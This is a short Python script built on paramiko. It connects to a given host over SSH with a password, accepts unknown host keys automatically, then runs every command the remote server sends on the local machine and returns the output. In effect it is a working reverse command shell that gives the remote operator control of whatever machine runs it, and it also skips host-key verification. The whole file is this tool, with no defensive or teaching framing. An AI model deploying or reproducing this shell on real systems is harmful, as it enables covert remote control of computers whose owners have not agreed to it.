import paramiko
import shlex
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        # read banner
        print(ssh_session.recv(1024).decode())
        while True:
            # get the command from the SSH server
            command = ssh_session.recv(1024).decode()
            try:
                cmd_output = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

